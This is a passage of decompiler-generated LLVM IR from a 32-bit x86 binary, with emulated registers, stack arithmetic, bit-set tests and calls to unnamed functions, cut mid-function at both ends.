  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_804fd58()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_804fe12(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp141, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049c31, %dec_label_pc_8049e5a, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3, %dec_label_pc_8049c42
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_80501c0()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_804fb51(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_804f640(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_805021e()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp142, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8052484.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_804f660()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8052484.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_804f660()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
